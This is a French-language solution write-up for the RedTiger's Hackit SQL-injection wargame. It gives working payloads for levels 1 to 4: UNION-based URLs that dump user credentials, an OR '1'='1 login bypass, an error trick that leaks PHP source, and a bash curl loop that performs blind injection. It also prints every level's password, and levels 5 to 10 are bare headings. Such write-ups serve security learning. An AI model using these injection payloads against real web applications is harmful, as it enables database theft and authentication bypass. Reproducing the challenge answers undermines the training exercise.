RedTigers-Hackit
================
https://redtiger.labs.overthewire.org/

1. Level 1 : Simple SQL-Injection
```
https://redtiger.labs.overthewire.org/level1.php?cat=1%20union%20select%201,2,username,password%20from%20level1_users
```
  You made it dude!

  The password for the next level is: easylevelsareeasy_! 
   
2. Level 2 : Simple login-bypass
```
username : a' OR '1'='1
password : a' OR '1'='1
```
  The password for the next level is: securitycat_says_meow_and_likes_cheese 
  
3. Level 3 : Get an error

  Génération de l'erreur :
```
https://redtiger.labs.overthewire.org/level3.php?usr%5B0%5D=a&usr%5B1%5D=b
```
Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21

```PHP
<?php
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ 192;
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s^192;
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}
?>
```
on le stocke dans un fichier php auquel on ajoute 
```php
echo encrypt($argv[1]);
```

plus qu'à trouver le nombre de champs et afficher le mot de passe 
```
curl --insecure -b level3login=securitycat_says_meow_and_likes_cheese https://redtigire.org/level3.php?usr=`php toto.php "' union select 1,username,3,4,5,password,7 from level3_users where username='Admin "` 
```
 Login correct. You are admin :); 
 The password for the next level is: dont_publish_solutions_GRR! 
 
4. Level 4 : Blind Injection
   Identification de la taille du mot à trouver
```
https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C10
=> 2 rows
https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C20
=> 1 row ==> taille entre 10 et 20 caractères
https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29=17
=> mot de 17 caractères

on devine maintenant le mot
for i in {1..17}; do
	for x in {a..z}; do 
	curl --insecure -b level4login=dont_publish_solutions_GRR%21 "https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20SUBSTR(keyword,$i,1)='$x'" 2>/dev/null |grep "2 rows"
	rc=$?
	if [[ $rc == 0 ]] ; then
		echo $x
		break;
	fi

	done
done
manque les derniers caractères :-(

for i in {14..17}; do
	for x in {0..9}; do
	curl --insecure -b level4login=dont_publish_solutions_GRR%21 "https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20SUBSTR(keyword,$i,1)='$x'" 2>/dev/null |grep "2 rows"
	rc=$?
	if [[ $rc == 0 ]] ; then
		echo $x
		break;
	fi

	done
done

==> blindinjection123
```
 Word correct. 
 The password for the next level is: bananas_are_not_yellow-sometimes 
5. Level 5 : Advanced login-bypass
6. Level 6 : SQL-Injection
7. Level 7 : SQL-Injection
8. Level 8 : SQL-Injection
9. Level 9 : SQL-Injection
10. Level 10
